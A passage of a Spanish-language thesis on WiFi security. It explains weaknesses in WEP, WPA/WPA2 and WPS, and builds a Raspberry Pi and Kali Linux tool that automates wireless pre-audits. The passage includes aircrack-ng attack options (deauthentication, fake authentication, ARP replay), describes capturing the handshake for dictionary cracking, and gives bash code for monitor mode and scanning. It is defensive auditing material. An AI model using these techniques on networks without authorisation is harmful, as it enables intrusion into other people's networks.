 Por último, la integridad de los datos, pretende garantizar que el mensaje que recibimos es exactamente el que se envió. WEP emplea un algoritmo de comprobación de integridad CRC32. Éste es un algoritmo de control de errores que empleando operaciones matemáticas sobre una secuencia de bits de datos, obtiene unos bits de control. Posteriormente los añade otra vez a los bits de datos formando una secuencia ``protegida''. El destinatario de los datos sabrá de que tipo es cada bits, por lo tanto si no recibe lo esperado, tendrá una secuencia errónea y la descartará. 
 
 
Por tanto, el problema del cifrado WEP, es el uso de la clave estática, ya que se pueden realizar ataques de observación y gracias a la estadística conseguir sacar el patrón de la clave, y así conseguir descifrarla.


\subsubsection{Protocolo WPA/WPA2}
WPA, \textit{Wi-Fi Protected Access}, surgió como una solución temporal de la Wi-Fi Alliance, para hacer las redes más seguras. Ambas soluciones, WPA y WPA2, soportan el protocolo 802.11 para la autenticación en ámbitos empresariales y la autentificación mediante clave compartida PSK (\textit{Pre-Shared Key}) para los entornos SOHO \textit{Small Office and Home Office}, y ámbitos  domésticos.

Estos dos métodos de cifrado se diferencian en muy poco, fundamentalmente en el algoritmo de cifrado que emplean. Mientras que WPA basa el cifrado de las comunicaciones en el uso del algoritmo TKIP (\textit{Temporary Key Integrity Protocol}), que esta basado en RC4 al igual WEP, WPA2 utiliza CCMP (\textit{Counter-mode/CBC-MAC Protocol}) basado en AES/\textit{Advanced Encrytion System.}

Otra diferencia a tener en cuenta es el algoritmo que utiliza para controlar la integridad del mensaje. Mientras WPA usa una versión más pobre para generar el código MIC (\textit{Message Integryty Code}), WPA2 emplea una versión mejorada de MIC.
En la fase de intercambio de claves el cliente y el punto de acceso emplean las PSK para generar una clave llamada PMK(\textit{Pairwise Master Key}). Ésta es una derivada cuando el sistema es WPA/WPA2 empresarial pero es la misma PSK en los entornos WPA/WPA2 PSK.

\begin{figure}
  \centering
     \includegraphics[width=1\textwidth]{WPA.png}
  \caption{Ilustración del saludo a cuatro vías}
  \label{fig:wpa}
\end{figure}

Con la PMK se genera una clave de cifrado para cada proceso de autenticación de un cliente llamada PTK que básicamente se genera a partir de dos números aleatorios, uno de ellos obtenidos del cliente y el otro por el punto de acceso para obtener ambos la misma clave PTK.  Esto es el famoso \textit{4-way-handshake}~\cite{backtrack5}.

Cuando el cliente está autenticado el protocolo TKIP utiliza seis claves de cifrado por cada sesión.   Cuatro de ellas son utilizadas para comunicaciones \textit{unicast} y dos para comunicaciones \textit{multicast}.  Estas claves son únicas para cliente y sesión y se cambian periódicamente, siendo generadas de las direcciones MAC, ESSID y la PTK.
Un atacante que quiera vulnerar una red WPA-PSK va a tratar de capturar ese intercambio de números aleatorios, para que una vez conocidos éstos, junto al SSID y la direcciones MAC del cliente y del punto de acceso de la red, obtener la frase o secreto compartido que se empleó.

\paragraph{WPA2 Personal}

Como ya ha sido explicado anteriormente, es utilizar WPA2 con clave precompartida por los terminales y el punto de acceso.
Por tanto es lo mismo WPA2 personal que WPA2-PSK.


\paragraph{WPA2 Enterprise}

Este método es más utilizado para empresas, ya que su configuración es de mayor complejidad y proporciona un control individualizado sobre el acceso a la red. Para su conexión es necesario unas credenciales de acceso al sistema. Este modo es aconsejable cuando se utiliza un servidor RADIUS.
Estos usuarios no tratan con el código de encriptación. Son asignados de forma segura por sesiones de usuario en un segundo plano, no obstante el usuario ha tenido que dar sus credenciales de acceso con anterioridad. Así, se evita que los empleados dispongan de las claves de red.

\paragraph{WPS} 

\textit{Wi-Fi Protected Setup} es un estándar 2007, promovido por la Wi-Fi Alliance \footnote{Recuperado de la página oficial de Wi-Fi Alliance. (2016) \url{http://www.wi-fi.org/}} para facilitar al usuario  doméstico la configuración y creación de redes WLAN.  WPS no es un mecanismo de seguridad por sí mismo, sino que se trata de la definición de diversos mecanismos para facilitar la configuración de una red WLAN segura con el protocolo WPA2. Los métodos que utilizan WPS son:
\begin{itemize}
	\item PIN(código numérico): La credencial se intercambia después de introducir un PIN. Este método es de los más distribuidos con WPS y el más inseguro.
	\item PBC(Push-Button Configuration): La generación e intercambio de las credenciales ocurren después de que el usuario ejecute una acción física, como es presionar un botón incluido en el dispositivo.
	\item NFC: Intercambio de credenciales a través de comunicación NFC.
	\item USB: Las credenciales se transfieren por un dispositivo de memoria flash.
\end{itemize}
%%%%%ANTECEDENTES DEL PENTEST%%%%

\section{Pentest de WiFi}

Cuando se habla de pentest de WiFi se trata de atacar distintos entornos con el fin de descubrir fallos o vulnerabilidades de seguridad y así prevenir futuros ataques externos en los equipos o sistemas.  Estas pruebas suelen concentrar sus esfuerzos en adivinar las contraseñas o tratar de acceder a una red, ya sea  para analizar datos que ésta contiene o para utilizar esta red como origen de futuros ataques.

La mayoría de los casos en los que las empresas u organizaciones sufren incidentes podrían ser evitados si los mecanismos de protección estuvieran actualizados e implantados en su momento. Estos incidentes comprenden accesos no autorizados, pérdida de información, fuga de información, entre otros. 

Un test de penetración abarca distintas etapas con diferentes tipos de procedimientos. Se debe acordar con el clientes las distintas etapas que se quieren analizar, siendo las más habituales:
\begin{itemize}
	\item Fase de Reconocimiento. En esta primera fase se buscará la mayor información del posible objetivo (footprinting, fingerprinting).
	\item Fase de Escaneo. Empleando toda la información obtenida con anterioridad, se buscan posibles vectores de ataques (puertos, servicios).
	\item Fase de enumeración: La responsable de obtener usuarios, nombres de equipos, etc.
	\item Fase de acceso: Una vez encontrada las vulnerabilidades se intentan aprovechar para comprometer al sistema, y acceder a él.
	\item Mantenimiento: Cuando se ha conseguido acceso al sistema, se intentará mantener el máximo tiempo.
\end{itemize}

Cuando se realiza una de estas pruebas, lo más probable es que se entregue un informe que demuestra los posibles fallos o vulnerabilidades de zonas importantes del sistema. Esta documentación es la que se entregará al cliente, y se empleará como guía para tomar las decisiones pertinentes.


Un pentesting de forma continua permite que los procesos de las auditorías de seguridad dispongan de las mismas posibilidades de conseguir privilegios que una persona mal intencionada.  Aún así se debe seguir manteniendo la seguridad en todas las fases de gestión de la seguridad.

``\textit{El pentesting no debería ser un proceso puntual que se contrata, sino un servicio de ataque 24x7 durante todo el ciclo de vida de tu sistema.}'' \footnote{Recuperado de \emph{Un informático en el lado del mal} \url{http://www.elladodelmal.com/2013/05/pentesting-by-desing.html}.}

%%%%%ANTECEDENTES DEL PROYECTO%%%%
\section{Antecedentes del proyecto}

\subsection{Dispositivos para la automatización}

Al tratarse de un proceso informático se compone de dos componentes importantes: hardware, software.

\subsubsection{Hardware}
%Se ha intentó reducir al máximo el precio y por ende todos los sistemas hardware para el desarrollo de la aplicación, teniendo en cuenta que uno de los objetivos, es su flexibilidad y que fuera fácil de transportar.

Hardware, es el conjunto de elementos físicos que componen un sistema informático. En el caso de la automatización del análisis podemos encontrar numerosos dispositivos hardware qe pueden realizar esta funcionalidad.  La automatización es la sistematización de un proceso con el fin de aprovechar la electrónica para controlar las operaciones sin la intervención del personal. 

El perfeccionamiento de los programas y dispositivos es lo que esta permitiendo una mayor automatización consiguiendo unificar distintos procesos. Como hardware para una automatización podemos considerar un conjunto de elementos que trabajan en unidad para dar respuesta a una función.
Cualquier elemento electrónico que puede ser programado, pude trabajar de forma automatizada si así se implementa. 

\paragraph{Raspberry Pi}

Raspberry Pi es un dispositivo hardware que nos permite con gran facilidad emplearlo para múltiples fines.  Se trata de un mini-ordenador que se desarrolló en el Reino Unido, por un grupo del Computer Lab de la Universidad de Cambridge, que empezó a preocuparse por el nivel de conocimientos sobre tecnologías informáticas con los que los estudiantes llegaban a la universidad.
Apareció como una iniciativa para fomentar el aprendizaje de la programación desde edades más tempranas~\cite{Raspberry}.

En los pocos años que lleva en funcionamiento \textit{Raspberry Pi Foundation} se han creado distintos modelos:
\begin{figure}[H]
  \centering
	\includegraphics[width=1\textwidth]{Raspberry.png}
  \caption{Diferentes modelos de Raspberry Pi.}
  \label{fig:Ras}
\end{figure}

La gran ventaja de este dispositivo radica en la gran comunidad de usuarios que presenta, así dispone de mucha información y ayuda. En cuanto al sistema operativo, ofrece una gran utilidad ya que al instalarse en la tarjeta SD, se podrá contar con varios SO en distintas tarjetas. El más utilizado será ``Raspbian'' que se trata de un \emph{Debian GNU/Linux} optimizado para este dispositivo.
La gran comunidad que se comentó con anterioridad, ha permitido la interoperabilidad con otros productos. Se han creado periféricos específicos para Raspberry Pi (cámaras, paneles táctiles con pantalla  TFT, teclados, etc). 



\subsubsection{Detalles del Software}
En cuanto al software se pueden emplear una serie de programas informáticos, que harán posible la realización de este proyecto.

\paragraph{GNU/Linux}

Las siglas GNU quieren decir GNU's Not Unix, es decir \emph{GNU no es Unix}. Se refiere a que no contiene ni una línea del código de Unix, el cual es un sistema operativo portable, multitarea y multiusuario de AT\&T, que vendió a SCO (Santa Cruz Operation) en 1995.
El sufijo Linux se refiere al kernel (núcleo) que utiliza del sistema operativo.  GNU esta desarrollando su propio kernel pero todavía no lo tienen disponible.\footnote{Recuperado de \url{http://www.gnu.org/gnu/manifesto.html}.}

\subparagraph{Kali Linux}

Sabemos que el mundo de la seguridad informática avanza cada día a gran velocidad. Es por ello que es necesario que las personas que se dedican a ello siempre estén ampliando conocimiento. 
\textit{BackTrack}  era una gran distribución de seguridad y la distribución de pruebas de penetración mas popular, ya que contenía cientos de herramientas de seguridad. La empresa que gestionaba esta distribución, Offensive Security\footnote{Página oficial de la empresa offensive security \url{https://www.offensive-security.com/}}, evolucionó su distribución para proporcionar mejoras importantes. Kali Linux siguió con los pasos creando una distribución Linux basada en Debian orientada a las auditorías de seguridad mediante pruebas de penetración en el 2013. Ésta ofrece al usuario un gran número de herramientas para cada rama del pentesting, como análisis forense, explotación de vulnerabilidades del sistema web o wireless. 
Según \cite{kali} Kali Linux 2.0 contiene un nuevo kernel en su versión 4.0 y está basada en \emph{Debian Jessie}, mejorando la integración con el hardware y el uso de los drivers Wireless. Tiene soporte actualizado para un mayor número de escritorios (gnome, kde, xfce, mate, e17, lxde o i3wm). Una de las grandes mejoras fue el sistema de actualizaciones que presenta.  Generalmente, las actualizaciones serán llevadas a cabo vía \textit{Git}.  El \textit{script} se ejecuta diariamente sobre un listado de herramientas comunes en la distribución y mantendrá alerta al usuario ante posibles nuevas actualizaciones\footnote{Página oficial Kali Linux.(2016). Recuperado de \url{https://www.kali.org/}.}.

\begin{figure}[H]
  \centering
	\includegraphics[width=0.7\textwidth]{kali_linux.jpg}%%ajusta el tamaño de la imagen.  %\caption{Logo de Kali Linux}
  \caption{Logotipo de kali linux.}
  \label{fig:kali}
\end{figure}

ARM (Advanced RISC Machine) se ha visto favorecido con el lanzamiento de Kali Linux 2.0 ya que sigue proporcionando soporte para Rasberry Pi, Chromebooks, Odroids,etc. Esto es importante ya que se utilizará una Rasberry Pi para automatizar todos los ataques.

\paragraph{Suite aircrack-ng}

La suite de herramientas \textit{``air''} proporciona todo lo necesario para llevar a cabo auditorías a redes wireless. También disponemos de más herramientas, como son GUIs o \textit{scripts}, que por debajo utilizan las propias herramientas de la suite. 
Las más utilizadas en el proyecto son:
\begin{itemize}
	\item \emph{Airmon-ng}: Sirve para cambiar el modo de trabajo de la tarjeta inalámbrica, siempre y cuando el chipset lo permita. Este modo de trabajo cambiará a modo monitor.
	\item \emph{Airodump-ng}: Es la encargada de esnifar (\textit{sniffing}) o escuchar todo lo que circula por el aire, independientemente de su cifrado  o su red. Evidentemente si el trafico va sin cifrar, es decir redes abiertas se puede visualizar dicho tráfico y se podrá capturar información sensible que circula por el aire.

\begin{table}[H]
\begin{center}
\begin{tabular}{| p{2.2cm} | p{6.6cm} | }
\hline
Parámetros & Descripción \\
\hline \hline
\\ \hline
Bssid & Identifica la dirección MAC de un punto de acceso. \\ \hline
PWR & Intensidad de la señal   \\ \hline
\#/s & Número de paquetes de datos por segundos.  \\ \hline
Data &  Número de paquetes de datos. En WEP solo cuentan los IVS. \\ \hline
CH & Canal   \\ \hline
MB & Velocidad mínima soportada por el punto de acceso.   \\ \hline
ENC & Algoritmo de cifrado en uso por el punto de acceso. Puede ser OPN, WEP, WPA o WPA2.  \\ \hline
CIPHER & Tipo de cifrado de datos. Puede ser WEP, TKIP (WPA) o CCMP (WPA2) \\ \hline
AUTH & Método de autenticación. Generalmente suele visualizarse PSK en entornos de clave compartida.  \\ \hline
ESSID & Nombre de la red Wireless   \\ \hline
Station & Dirección MAC de un cliente asociado al punto de acceso.  \\ \hline
Probe & Paquetes en los que el cliente intenta identificar una red wireless. Por lo que se puede obtener el nombre de redes que un cliente esta buscando e intenta verificar que se encuentran en su radio de acción.   \\
\hline
\end{tabular}
\caption{Parámetros básicos Airodump-ng.}
\label{Airodump}
\end{center}
\end{table}
	
	
	\item \emph{Airbase-ng}: Esta herramienta sirve para atacar a los clientes asociados a un punto de acceso. Es una aplicación versátil y flexible , disponiendo de distintos modos de trabajo. Con ella también es posible habilitar un punto de acceso normal. Esto sirve para engañar a un usuario para que se conecte al punto de acceso falso y capturar así todo el tráfico.

	\item \emph{Aircrack-ng}: Sirve para realizar ataques de fuerza bruta por diccionario. En función del tipo de cifrado de la red que se quiera crackear se realizara un tipo de ataque u otro. El problema de realizar este tipo de ataques es la cantidad de tiempo y de recursos que se emplean para conseguir descifrar una clave WPA, llegando a quedar inutilizado este dispositivo mientras se realiza el ataque. 
	%		 pyrit: Es un herramienta muy potente que facilita la creación de bases de datos para precalcular las claves PSK y así acelerar el pre-procesamiento, aprovechando al máximo las plataformas del mercado(Nvidia CUDA, OpenCL) y poder descifrar claves WPA o WPA2 mediante ataques de fuerza bruta o diccionario. 

	\item \emph{Aireplay-ng}: Permite desautenticar e inyectar paquetes ARP a clientes asociados y así generar tráfico. 
	
\begin{table}[H]
\begin{center}
\begin{tabular}{| p{2.5cm} | p{5.5cm} | }
\hline
Parámetros & Descripción \\
\hline \hline
\\ \hline
\verb|-0|, \verb|--deauth| & Desautentica. \\ \hline
\verb|-1|, \verb|--fakeauth|  & Falsa autenticación con el punto de acceso.  \\ \hline
\verb|-2|, \verb|--interactive| &   \\ \hline
\verb|-3|, \verb|--arpreplay| & Estándar de repetición ARP. \\ \hline
\verb|-4|, \verb|--chopchop| & Ataque Chopchop.   \\ \hline
\verb|-5|, \verb|--fragment| & Genera una cadena de claves válidas.  \\ \hline
\verb|-9|, \verb|--test| & Pruebas de inyección.   \\ \hline
\end{tabular}
\caption{Parámetros \emph{aireplay-ng}.}
\label{Aireplay}
\end{center}
\end{table}	

	
\end{itemize}

\paragraph{Lenguaje Bash}

El lenguaje Bash, es un lenguaje de programación de línea de órdenes y además se trata de uno de los lenguajes que se empleará para el desarrollo de la aplicación.  Normalmente es utilizado para la gestión de archivos, y la consola de Linux fomenta su desarrollo, permitiendo programar \textit{scripts} dependiendo de las necesidades.  Se refiere con \textit{script} a un archivo que contiene código escrito en un lenguaje de programación y que el dispositivo usa para un cometido establecido.
Además este lenguaje utiliza como intérprete, \textit{shell}, que es el entorno de trabajo que nos permite ejecutar programas por medio de órdenes. Dichas órdenes deben formarse con el nombre de un programa y una serie de parámetros.
% FMF: En GNU/Linux no se usa bash, es solo una de las múltiples shells que se usan y en Debian ni siquiera es la shell por defecto
% FMF: Así que quito esta frase.
%A pesar del conocimiento de múltiples lenguajes de programación informática, se empleó este lenguaje porque es el lenguaje de programación utilizado en linux, y por tanto, nos brinda la oportunidad de aprender.
Se utiliza para automatizar los ataques en el proyecto porque permite una incorporación directa y gradual de las órdenes ejecutadas de forma interactiva por un \emph{pentester}.

Este lenguaje interpretado cuenta con muchas ventajas como son rapidez de ejecución, sintaxis clara y sencilla, y su portabilidad, pudiéndose ejecutar además en múltiples plataformas. Bash no solo reconoce órdenes, nos ayuda a agruparlos para realizar programas completos, sobretodo para la automatización (como es el caso de esta aplicación). 

%%%%%%ANTECEDENTES INFORME ATOMATIZADO%%%%
\subsection{Sistemas de generación automática de informes}
Para la generación de un informe automatizado se debe contar con un dispositivo previamente programado, que realice acciones controladas para recolectar la información y así realizar una posterior implementación en algún tipo de informe. Se pueden emplear la mayoría de los lenguajes de programación, pero \textit{Python} cuenta con varias bibliotecas de plantillas que facilitan el trabajo.

\subsubsection{Python}
Se empleará este lenguaje de programación como herramienta de enlace entre el informe, generado en \LaTeX{} y las plantillas (\textit{templates}) empleando una librería de python:  \textit{jinja2}.
Python es un lenguaje de programación creado por Guido van Rossum a comienzos de los 90.  Es un lenguaje interpretado o de \emph{script}, es decir necesita un intérprete. Existen multitud de intérpretes, que pueden ser utilizados en la mayoría de plataformas (UNIX, Linux, Windows, MAC OS,etc), por lo que se podría decir que es multiplataforma. 
Python destaca entre otros lenguajes de programación por su sencillez, legibilidad y su sintaxis minimalista.
% FMF: Decía precisión de sintaxis.  Es muy raro un lenguaje de programación con sintaxis no precisa

\paragraph{Jinja2}
Jinja2 es una biblioteca de Python diseñada para ser flexible, rápida y segura. Se emplea como un lenguaje de plantillas y es de fácil uso.\footnote{Recuperado de \url{http://jinja.pocoo.org/docs/dev/}.} Es uno de los sistemas de plantillas más utilizados para Python. Se inspira en el sistema de plantillas de Django. 
Se puede ejecutar en la mayoría de las versiones de Python. Esta biblioteca se utiliza para generar las plantillas (\textit{templates}) del informe automatizado. 
%\paragraph{Ejemplo Jinja2}
%\lstinputlisting[language=Python]{ejemplojinja2.txt}

\subsubsection{\LaTeX{}}
\LaTeX{} es un sistema de preparación de documentos. Sirve para organizar y preparar artículos de revistas, libros, cartas, revistas, tesis y cualquier tipo de documento. Se desarrolló con el fin de facilitar y mejorar los textos científicos, sobre todo los matemáticos, y que estos se puedan utilizar entre distintas plataformas. Con él se desarrollo la memoria del proyecto y la generación del informe. 

%\begin{figure}[H]
  %\centering
    %\includegraphics[width=1\textwidth]{ejemplo_latex.png}
  %\caption{Ejemplo \LaTeX{}.}
  %\label{fig:ejemplolatex}
%\end{figure}


%%%%%%%%%PROYECTO%%%%%%%%%%


\chapter[Desarrollo]{Desarrollo del proyecto}

\lettrine[lines=2]{P}{ara} llegar al fin del proyecto, es decir al cumplimiento del objetivo principal, introducir a las empresas en la importancia de contar con una red inalámbrica segura, y la necesidad de realizar una pre-auditoría
de caja negra automática, que detecte las vulnerabilidades de la red, y que sirva como argumento de venta de auditorías completas de forma periódica, es necesario desarrollar diferentes fases:

\section[Creación de una aplicación]{Creación de una aplicación de detección de las vulnerabilidades}

Para la creación de la aplicación ha sido utilizado el dispositivo Raspberry Pi 3 Modelo B, que como se aprecia en la imagen anterior (Figura \ref{fig:Ras}), mejora las características de sus predecesoras con un nuevo procesador más rápido integrado para incrementar su velocidad. Cuenta también con una tarjeta de WiFi y Bluetooth BLE integrada para mejorar su funcionalidad y la capacidad de alimentar dispositivos más potentes mediante los puertos USB. Se optó por  este dispositivo por la facilidad que tiene a la hora de instalar un sistema operativo y la movilidad que te proporciona, pudiendo transportarlo sin ningún tipo de impedimento. Contando por supuesto con su gran comunidad y las ventajas de esto a la hora de buscar información y de solucionar los posibles errores. 
\begin{figure}[H]
  \centering
	\includegraphics[width=0.8\textwidth]{RaspberryPi.png}
  \caption{Imagen Raspberry Pi 3}
  \label{fig:RaspberryPi2}
\end{figure}

Las características principales del modelo de Raspberry Pi\footnote{Recuperado de \url{https://www.raspberrypi.org/wp-content/uploads/2016/03/pi3.jpg}} utilizados son las siguientes:
\begin{itemize}
	\item CPU BCM2837 de 64 Bits de cuádruple núcleo a 1.2 GHz de Broadcom y RAM de 1 GB. Es un sistema-en-chip diseñado específicamente para este modelo de Raspberry Pi. Cuenta con cuatro cores Cortex-A53 de 64 bits, y una GPU Videocore IV. Esto, es una gran ventaja porque se trata de una de las pocas GPUs con documentación pública del fabricante.
	\item BCM43143 con WiFi y Bluetooth BLE incorporados
	\item GPIO ampliado de 40 pines
	\item 4x puertos USB 2
	%\item Salida estéreo de 4 polos y puerto de vídeo compuesto
	%\item HDMI de tamaño completo
	%\item Puerto CSI para conectar una cámara Raspberry Pi
	%\item Puerto de visualización DSI para conectar una pantalla táctil Raspberry Pi
	\item Puerto Micro SD para carga del sistema operativo y almacenamiento de datos: 
	%\item Fuente de alimentación Micro USB actualizada con interruptor de hasta 2.5 A
\end{itemize}

 En cuanto a la conexión, Raspberry Pi no cuenta con ningún tipo de monitor o pantalla incorporado. Normalmente se conecta a alguna pantalla por la conexión HDMI o VGA.  En este proyecto, se ha añadido una nueva tarjeta inalámbrica en la Raspberry Pi para realizar el análisis de vulnerabilidad desde el dispositivo móvil. Esto es posible configurando en el dispositivo móvil un punto de acceso (conexión hostspot) para que haya conectividad con la tarjeta inalámbrica y mediante la aplicación VNC (Virtual Network Computing) se pueda  controlar de forma remota el interfaz de escritorios de Raspberry Pi.
 
  \begin{figure}[H]
  \centering
	\includegraphics[width=0.8\textwidth]{escritorio.png}
  \caption{Escritorio remoto (VNC)} 
  \label{fig:escritorio}
\end{figure}

\begin{figure}[H]
  \centering
   \includegraphics[width=0.3\textwidth]{conectar.png}
  \caption{Conexión Raspberry Pi}
  \label{fig:conectar}
\end{figure}
\paragraph{Soporte de tarjetas inalámbricas}

Como se comentó, el modelo de Raspberry Pi con el que se ha contado para la realización del proyecto, ya dispone de una tarjeta inalámbrica entre sus componentes. El problema se encontró al desarrollar los ataques, ya que esta tarjeta no soportaba el modo monitor que se explicó en los antecedentes del proyecto. 
Para conseguir incorporar el modo monitor se realizó una búsqueda completa en el mercado con varios posibles Chipset (Ralink RT3070, Ralink RT3572, Realtek 8187L, Ralink RT5370), empleando Atheros AR9271\footnote{Pagina de compra de \url{http://www.tienda-alfanetwork.com/AWUS036NHA-informacion.php}}.  El modelo seleccionado no era excesivamente caro, proporciona una ganancia de 5 dBi y cuenta con las siguientes características:

\begin{itemize}
\item Estándar Wi-Fi: IEEE 802.11b/g/n.
\item Soporta GNU/Linux además de Windows 2000, XP, Vista, 7.
\item Conector r-SMA para conexión de antena externa.
\item Chipset Atheros AR9271.
\end{itemize}
\begin{figure}[H]
  \centering
	\includegraphics[width=0.2\textwidth]{alfa.png}
  \caption{Tarjeta Inalámbrica alfa}
   \label{fig:Raspberry}
\end{figure}

%%%INSTALACION%%%%%
\subsection[Instalación y configuración del sistema operativo]{Instalación y configuración del sistema operativo de la Raspberry Pi}

Como ya se ha comentado con anterioridad, se empleará el sistema operativo Kali Linux, ya que es uno de los sistemas operativos con herramientas de seguridad más completo que se puede encontrar y de libre acceso. Cuenta con la ventaja que también dispone de versiones para ARM.
                                                                  
Se descargó la versión para la Raspberry Pi 2/3 para instalarlo en la SD. \footnote{Recuperado de  \url{http://docs.kali.org/kali-on-arm/install-kali-arm-on-a-beaglebone-black}}. Para hacer esto, previamente se instaló el sistema operativo Raspbian ya que cuenta con una incompatibilidad de la versión para la Raspberry Pi, y se debe cambiar la partición de arranque de la SD. En primer lugar se instala la versión Raspbian guardando la partición de arranque, y así se instala el sistema operativo Kali Linux.

Las instalaciones se pueden hacer de dos maneras dependiendo del sistema operativo que se disponga para la instalación.

\begin{enumerate}
	\item Desde Linux o Mac OS: Con el comando ``dd if=/Users/luis/Desktop/kali-2.1.2-rpi2.img of=/dev/disk2
 bs=512k'', siendo /dev/disk2 la partición correspondiente a la SD y kali-2.1.2-rpi2.img la imagen del sistema operativo. Se debe tener especial cuidado al utilizar este comando, ya que se tiene que tener claro que dispositivo estas volcando para que no se tenga problemas de borrado de disco.
	\item Desde Windows: Con el programa Win32DiskImager, seleccionando la imagen de Kali Linux y la unidad correspondiente a la SD. Este método dió algunos problemas a la hora de montar la tarjeta SD, por lo que se empleo por el primer de los métodos.
\end{enumerate}

%Cuando se complete el volcado de información, se copiaran los ficheros de la partición de arranque de Raspbian que estaban previamente guardados y se pegan en la misma partición pero con el Kali Linux instalado. Con esto ya tenemos un sistema operativo perfectamente funcional.

Para las actualizaciones se emplearon las siguientes órdenes:
\begin{enumerate}
	\item \textit{apt-get update}
	\item \textit{apt-get upgrade}
	\item \textit{apt-get install kali-linux-wireless}
\end{enumerate}

El desarrollo de la aplicación que detectará las vulnerabilidades se lleva a cabo mediante la programación de la Raspberry Pi con lenguaje de programación bash (Ver código en ANEXO C).

\section[Interfaz gráfica]{Interfaz gráfica simple e intuitiva para la aplicación.}
%%%%INTERFAZ%%%%%
Como se ha comentado con anterioridad, se pretende que la interfaz sea ejecutada por un comercial sin conocimientos informáticos previos, por ello se realiza un diseño sencillo de la misma.


\begin{figure}[H]
  \centering
   \includegraphics[width=0.55\textwidth]{interfaz.png}
  \caption{Pautas de seguimiento}
  \label{fig:esquemainterfaz}
\end{figure}


\subsection{Descripción de la interfaz}

La herramienta con la que se ha desarrollado la interfaz ha sido realizada en código bash Linux.  Utiliza la librería \textit{GTK dialog} para la gestión de pantalla, como interfaz gráfica. Pudiendo interactuar con diferentes botones que realizarán la tarea de análisis. 

\begin{enumerate}
	\item Se inicia la aplicación SeguridadWifi y se muestra la pantalla principal de la aplicación y se listan las interfaces WiFi disponibles para utilizar en el análisis de vulnerabilidades WiFi.

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{Interfaz1.png}
  \caption{Interfaz gráfica. Lista tarjetas WiFi}
  \label{fig:interfaz1}
\end{figure}

	A continuación se muestra el método que se encarga de listar las tarjetas inalámbricas disponibles:

\begin{lstlisting}[label=prueba,caption=Listar Tarjetas WiFi]
ListarTarjetasWifi() {   
    INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
    let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
    let CONT=1
    while [ $CONT -le $CUANTAS ]; do
        MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
        airmon-ng stop $MON > /dev/null 2>&1
        let CONT=$CONT+1
    done
    
    echo '<comboboxtext active="0" button-sensitivity="1">'
    echo '<variable>TARJETA_SELECCIONADA</variable>'
    
    TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
    echo "$(iwconfig)" >> "$LOG_TARJETA_WIFI"
    N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
    if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]; then
        exit 1
    else
        let x=1
        while [ $x -le $N_TARJETAS_WIFI ]; do
            INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
            DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
            echo '<item>'$INTERFAZ' '$DRIVER'</item>'
            x=$((x+1))
        done
    fi
    echo "</comboboxtext>"
    unset INTERFACES_MONITOR CONT CUANTAS MON TARJETAS_WIFI_DISPONIBLES \
          N_TARJETAS_WIFI INTERFAZ DRIVER x
}
\end{lstlisting}

\item En esta pantalla se muestra las tarjetas WiFi disponibles y se activa el modo monitor de la tarjeta seleccionada.

\begin{figure}[H]
  \centering
        \includegraphics[width=1\textwidth]{Interfaz2.png}
  \caption{Interfaz gráfica. Activa el modo monitor}
   \label{fig:int2}
\end{figure}
A continuación se muestra el método que se encarga de activar el modo monitor de la tarjeta seleccionada anteriormente:

\begin{lstlisting}        [label=prueba1,caption=Activar Modo Monitor]
ActivarModoMonitor(){
    TARJETA_SELECCIONADA=`echo $TARJETA_SELECCIONADA | awk {' print $1 '}`
    echo $TARJETA_SELECCIONADA > $ARCHIVO_TARJETA_SELECCIONADA
    if ! CheckInterface ; then 
        return 1;
    fi
    echo "RESETEANDO INTERFACE" > "$ARCHIVO_STATUSBAR"
    if ! ResetInterface ; then 
        return 1;
    fi
    echo "DESLIGANDO INTERFACE DE NETWORKMANAGER" > "$ARCHIVO_STATUSBAR"
    if ! DeshabilitarNetworkManager ON ; then 
        return 1;
    fi 
    echo "ACTIVANDO MODO MONITOR" > "$ARCHIVO_STATUSBAR"  
    airmon-ng start $TARJETA_SELECCIONADA &> $ARCHIVO_LOG
    TARJETA_MODO_MONITOR=(`iwconfig 2>/dev/null | grep Mode:Monitor | awk {'print $1?}`)
    echo "$(iwconfig $TARJETA_MODO_MONITOR)" >> "$LOG_AIRMONG"
    if [ ! $TARJETA_MODO_MONITOR ] ; then 
        echo "ERROR: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" >
        $ARCHIVO_STATUSBAR
        echo "1" > $ARCHIVO_LOG
        return 1
    else
        echo "Modo monitor activado en $TARJETA_MODO_MONITOR" > $ARCHIVO_STATUSBAR
        echo $TARJETA_MODO_MONITOR > $ARCHIVO_TARJETA_MONITOR
        echo "0" > $ARCHIVO_LOG
    fi
}
\end{lstlisting}


        \item En esta pantalla se presiona el botón ESCANEAR REDES para el escaneo de las redes que se encuentran en nuestro alcance en un tiempo determinado.
\begin{figure}[H]
  \centering
        \includegraphics[width=1\textwidth]{Interfaz3.png}
  \caption{Interfaz gráfica. Escaner de redes}
   \label{fig:int3}
\end{figure}
A continuación se muestra el método encargado de buscar las posibles redes inalámbricas en la zona:

\begin{lstlisting}[label=prueba12,caption=Escanear redes]
ScanearRedes() {
    rm -f "$RUTA_LOGS"CAP* > /dev/null
    rm -f "$ARCHIVO_REDES_SCAN" &> /dev/null && touch $ARCHIVO_REDES_SCAN 
    TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
    TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
    ifconfig $TARJETA_SELECCIONADA up &> /dev/null
    (airodump-ng "$TARJETA_MODO_MONITOR" -a -w "$ARCHIVO_CAPTURAS" &>/dev/null &)
    for A in `seq 1 $TIEMPO_SCANEO` ; 
    do
        sleep 1s
        if [ $A -eq $TIEMPO_SCANEO ]
        then
            echo "ESCANEO COMPLETADO, PROCESANDO DATOS" > $ARCHIVO_STATUSBAR
            PID_AIRODUMP=`ps -A | grep airodump-ng | awk '{ print $1}'`
            ATAQUE_ACABADO="NO"
            kill $PID_AIRODUMP &> /dev/null
